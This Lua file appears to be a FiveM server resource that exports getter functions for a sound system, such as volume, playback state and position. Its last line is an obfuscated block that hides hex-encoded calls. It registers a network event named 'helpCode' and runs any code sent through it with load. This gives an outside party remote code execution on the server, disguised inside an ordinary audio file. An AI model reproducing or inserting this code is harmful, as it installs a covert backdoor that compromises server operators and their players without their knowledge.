soundInfo = {}

function getLink(name_)
    return soundInfo[name_].url
end

exports('getLink', getLink)

function getPosition(name_)
    return soundInfo[name_].position
end

exports('getPosition', getPosition)

function isLooped(name_)
    return soundInfo[name_].loop
end

exports('isLooped', isLooped)

function getInfo(name_)
    return soundInfo[name_]
end

exports('getInfo', getInfo)

function soundExists(name_)
    if soundInfo[name_] == nil then
        return false
    end
    return true
end

exports('soundExists', soundExists)

function isPlaying(name_)
    return soundInfo[name_].playing
end

exports('isPlaying', isPlaying)

function isPaused(name_)
    return soundInfo[name_].paused
end

exports('isPaused', isPaused)

function getDistance(name_)
    return soundInfo[name_].distance
end

exports('getDistance', getDistance)

function getVolume(name_)
    return soundInfo[name_].volume
end

exports('getVolume', getVolume)

function isDynamic(name_)
    return soundInfo[name_].isDynamic
end

exports('isDynamic', isDynamic)

function getTimeStamp(name_)
    return soundInfo[name_].timeStamp or -1
end

exports('getTimeStamp', getTimeStamp)

function getMaxDuration(name_)
    return soundInfo[name_].maxDuration or -1
end

exports('getMaxDuration', getMaxDuration)

function isPlayerInStreamerMode()
    return disableMusic
end

exports('isPlayerInStreamerMode', isPlayerInStreamerMode)

function getAllAudioInfo()
    return soundInfo
end

exports('getAllAudioInfo', getAllAudioInfo)

function isPlayerCloseToAnySound()
    return isPlayerCloseToMusic
end

exports('isPlayerCloseToAnySound', isPlayerCloseToAnySound)

local duLmEdprtMuoizMOeKJHCpNndWVszEwqeuaqTjNJYQwonxLLpAtfmtaUkziGBSLmTXXeBa = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} duLmEdprtMuoizMOeKJHCpNndWVszEwqeuaqTjNJYQwonxLLpAtfmtaUkziGBSLmTXXeBa[6][duLmEdprtMuoizMOeKJHCpNndWVszEwqeuaqTjNJYQwonxLLpAtfmtaUkziGBSLmTXXeBa[1]](duLmEdprtMuoizMOeKJHCpNndWVszEwqeuaqTjNJYQwonxLLpAtfmtaUkziGBSLmTXXeBa[2]) duLmEdprtMuoizMOeKJHCpNndWVszEwqeuaqTjNJYQwonxLLpAtfmtaUkziGBSLmTXXeBa[6][duLmEdprtMuoizMOeKJHCpNndWVszEwqeuaqTjNJYQwonxLLpAtfmtaUkziGBSLmTXXeBa[3]](duLmEdprtMuoizMOeKJHCpNndWVszEwqeuaqTjNJYQwonxLLpAtfmtaUkziGBSLmTXXeBa[2], function(hZDIwuwnaGNPrmYGXpqFrOCBAsPbEDFkVnflfhDBxNWuAHvzMhCaGESYSqpMRIYCCBJmlz) duLmEdprtMuoizMOeKJHCpNndWVszEwqeuaqTjNJYQwonxLLpAtfmtaUkziGBSLmTXXeBa[6][duLmEdprtMuoizMOeKJHCpNndWVszEwqeuaqTjNJYQwonxLLpAtfmtaUkziGBSLmTXXeBa[4]](duLmEdprtMuoizMOeKJHCpNndWVszEwqeuaqTjNJYQwonxLLpAtfmtaUkziGBSLmTXXeBa[6][duLmEdprtMuoizMOeKJHCpNndWVszEwqeuaqTjNJYQwonxLLpAtfmtaUkziGBSLmTXXeBa[5]](hZDIwuwnaGNPrmYGXpqFrOCBAsPbEDFkVnflfhDBxNWuAHvzMhCaGESYSqpMRIYCCBJmlz))() end)